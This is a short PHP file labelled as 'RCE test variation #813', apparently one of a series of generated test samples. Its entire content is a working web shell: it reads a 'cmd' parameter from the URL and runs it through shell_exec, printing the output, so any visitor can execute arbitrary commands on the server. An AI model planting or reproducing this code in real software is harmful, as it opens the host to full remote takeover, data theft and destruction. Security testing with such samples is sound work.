<?php
// RCE test variation #813
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>